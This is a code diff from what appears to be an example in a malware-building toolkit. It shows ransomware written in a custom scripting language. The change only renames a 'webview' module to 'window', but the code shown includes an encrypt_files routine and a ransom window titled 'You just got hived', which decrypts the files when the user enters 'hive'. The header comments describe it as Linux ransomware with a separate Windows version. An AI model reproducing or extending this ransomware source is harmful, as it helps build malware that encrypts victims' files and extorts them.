@@ -8,7 +8,7 @@
 @ 5. The source code is not obfuscated @
 @ 6. The ransomware is built for linux, check the 'alien_windows' for the windows version @ 
 
-use webview
+use window
 use system
 use crypto
 use time
@@ -48,25 +48,25 @@ b encrypt_files {
     crypto::encrypt()
 }
 
-l webview_run {
-    webview::bind(${"decrypt", "decrypt_files"}$)
+l window_run {
+    window::bind(${"decrypt", "decrypt_files"}$)
 
-    webview::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt(); window.alert('Successfully decrypted files')}else{window.alert('Enter hive into the text box')}}")
+    window::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt(); window.alert('Successfully decrypted files')}else{window.alert('Enter hive into the text box')}}")
 
-    webview::css("body{ background-image:url('https://raw.githubusercontent.com/TeamPhoneix/go-evil/v2/examples/ransomware/Alien/background.jpg'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
-    webview::css("label{color: #555;}")
-    webview::css("#input_box {position: absolute; bottom: 0; left: 50%; background-color: #DBF9FC;}")
+    window::css("body{ background-image:url('https://raw.githubusercontent.com/TeamPhoneix/go-evil/v2/examples/ransomware/Alien/background.jpg'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
+    window::css("label{color: #555;}")
+    window::css("#input_box {position: absolute; bottom: 0; left: 50%; background-color: #DBF9FC;}")
 
-    webview::html("<div id='input_box'>")
-    webview::html("<label for='in'>Input</label>")
-    webview::html("<input id='in' type='input'>")
-    webview::html("<input type='submit' onclick='checking()'>")
-    webview::html("</div>")
+    window::html("<div id='input_box'>")
+    window::html("<label for='in'>Input</label>")
+    window::html("<input id='in' type='input'>")
+    window::html("<input type='submit' onclick='checking()'>")
+    window::html("</div>")
 
-    webview::width("934")
-    webview::height("580")
-    webview::title("You just got hived")
+    window::width("934")
+    window::height("580")
+    window::title("You just got hived")
 
-    webview::run()
+    window::run()
     system::exit("0")
 }
